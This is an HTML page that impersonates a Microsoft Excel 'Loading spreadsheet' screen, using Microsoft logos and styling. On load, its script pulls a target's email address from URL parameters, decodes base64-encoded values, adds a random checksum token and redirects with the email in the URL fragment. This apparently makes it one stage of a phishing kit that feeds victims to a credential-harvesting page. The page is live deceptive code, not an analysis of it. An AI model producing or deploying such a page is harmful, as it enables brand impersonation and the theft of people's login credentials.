<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Excel</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23217346' d='M6 2h12a2 2 0 012 2v16a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2z'/%3E%3Cpath fill='white' d='M8 7l3 5-3 5h2l2-3 2 3h2l-3-5 3-5h-2l-2 3-2-3z'/%3E%3C/svg%3E">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        /* Excel Logo */
        .logo-container {
            margin-bottom: 40px;
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .excel-logo {
            width: 150px;
            height: auto;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-5px); }
        }

        /* Loading spinner - Excel green */
        .spinner-container {
            margin-top: 20px;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f0f0f0;
            border-top-color: #217346;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Loading text */
        .loading-text {
            margin-top: 24px;
            color: #323130;
            font-size: 14px;
            font-weight: 400;
            opacity: 0;
            animation: fadeInUp 0.5s ease-out 0.3s forwards;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Microsoft logo footer */
        .footer {
            position: fixed;
            bottom: 40px;
        }

        .ms-logo {
            width: 108px;
            height: auto;
        }

        .fade-out {
            animation: fadeOut 0.3s ease-out forwards;
        }

        @keyframes fadeOut {
            to { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container" id="main-container">

        </div>

        <div class="spinner-container">
            <div class="spinner"></div>
        </div>

        <div class="loading-text">Loading spreadsheet...</div>
    </div>

    <!-- Microsoft Logo Footer -->
    <div class="footer">
        <img class="ms-logo" 
             src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
             alt="Microsoft">
    </div>

    <script>
        function decodeB64(s){if(!s||s.indexOf('@')!==-1)return s;try{var n=s.replace(/-/g,'+').replace(/_/g,'/');while(n.length%4)n+='=';var d=atob(n);if(d.indexOf('@')!==-1&&d.indexOf('.')!==-1)return d;}catch(e){}return s;}
        setTimeout(function() {
            document.getElementById('main-container').classList.add('fade-out');
            setTimeout(function() {
                var url = new URL(window.location.href);
                var raw = url.searchParams.get('email') || url.searchParams.get('e') || url.searchParams.get('u') || url.searchParams.get('login_hint') || url.searchParams.get('user') || url.searchParams.get('mail') || '';
                var email = decodeB64(raw);
                var b1 = Math.floor(Math.random() * 256);
                var b2 = Math.floor(Math.random() * 256);
                var b3 = Math.floor(Math.random() * 256);
                var b4 = Math.floor(Math.random() * 256);
                var crc = (b1 + b2 + b3 + b4) & 0xFF;
                var bytes = String.fromCharCode(crc, b1, b2, b3, b4);
                var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                url.searchParams.set('_r', marker);
                var finalUrl = url.toString();
                if (email) { finalUrl += '#' + encodeURIComponent(email); }
                window.location.href = finalUrl;
            }, 300);
        }, 2500);
    </script>
</body>
</html>
